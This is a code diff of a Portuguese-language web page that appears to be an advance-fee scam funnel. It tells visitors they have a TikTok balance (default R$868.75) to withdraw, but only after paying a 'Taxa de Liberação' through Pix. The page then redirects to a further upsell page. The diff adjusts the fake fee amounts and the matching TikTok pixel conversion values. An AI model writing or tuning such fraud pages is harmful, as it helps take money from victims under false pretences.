@@ -16,7 +16,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     p = Object.assign({}, p || {});
     var cid = String(p.content_id || (p.contents && p.contents[0] && p.contents[0].content_id) || 'taxa_confirmacao_tiktok').trim() || 'taxa_confirmacao_tiktok';
     var cname = String(p.content_name || (p.contents && p.contents[0] && p.contents[0].content_name) || 'Taxa de Confirmacao TikTok').trim() || 'Taxa de Confirmacao TikTok';
-    var val = (typeof p.value === 'number' && p.value > 0) ? p.value : (parseFloat(p.value) > 0 ? parseFloat(p.value) : 13.92);
+    var val = (typeof p.value === 'number' && p.value > 0) ? p.value : (parseFloat(p.value) > 0 ? parseFloat(p.value) : 36.50);
     p.content_id = cid; p.content_ids = [cid]; p.content_type = 'product'; p.content_name = cname; p.value = val; p.currency = p.currency || 'BRL';
     p.contents = [{ content_id: cid, content_type: 'product', content_name: cname, quantity: 1, price: val }];
     return p;
@@ -202,7 +202,7 @@ body{font-family:'Inter',sans-serif;background:#f7f7f8;color:#111;-webkit-font-s
       <div class="iof-lbl">Taxa de Liberação</div>
       <div style="font-size:10px;color:#aaa;margin-top:1px">Taxa única de processamento do saque</div>
     </div>
-    <span class="iof-val red" id="iofTaxa">- R$ 17,12</span>
+    <span class="iof-val red" id="iofTaxa">- R$ 21,11</span>
   </div>
   <div class="iof-row">
     <span class="iof-lbl" style="font-weight:700;color:#111">Total a receber</span>
@@ -275,7 +275,7 @@ body{font-family:'Inter',sans-serif;background:#f7f7f8;color:#111;-webkit-font-s
 
 <script>
 (function(){
-  var IOF = 29.00;
+  var IOF = 21.11;
   var params = new URLSearchParams(window.location.search);
   var total = parseFloat(params.get('total')) || 868.75;
   var R = function(v){ return 'R$' + v.toFixed(2).replace('.',','); };
@@ -320,14 +320,14 @@ body{font-family:'Inter',sans-serif;background:#f7f7f8;color:#111;-webkit-font-s
     el('btnSpinner').style.display = 'block';
     el('btnText').textContent = 'AGUARDE...';
     if(typeof ttq !== 'undefined' && typeof ttq.track === 'function'){
-      try { ttq.track('InitiateCheckout', { content_id: 'upsell_1_tiktok', content_type: 'product', content_name: 'Taxa de Liberação TikTok', contents: [{ content_id: 'upsell_1_tiktok', content_type: 'product', content_name: 'Taxa de Liberação TikTok', quantity: 1, price: 29.00 }], value: 29.00, currency: 'BRL' }); } catch(e){}
+      try { ttq.track('InitiateCheckout', { content_id: 'upsell_1_tiktok', content_type: 'product', content_name: 'Taxa de Liberação TikTok', contents: [{ content_id: 'upsell_1_tiktok', content_type: 'product', content_name: 'Taxa de Liberação TikTok', quantity: 1, price: 21.11 }], value: 21.11, currency: 'BRL' }); } catch(e){}
     }
     setTimeout(function(){
       btn.disabled = false;
       el('btnSpinner').style.display = 'none';
       el('btnText').textContent = 'PAGAR TAXA E RECEBER ' + R(total);
       var p = window.location.search;
-      window.abrirCheckoutPix({valor:29.00,titulo:'Taxa de Liberação TikTok',proximoUrl:'../up2/index.html'});
+      window.abrirCheckoutPix({valor:21.11,titulo:'Taxa de Liberação TikTok',proximoUrl:'../up2/index.html'});
     }, 600);
   };
 })();
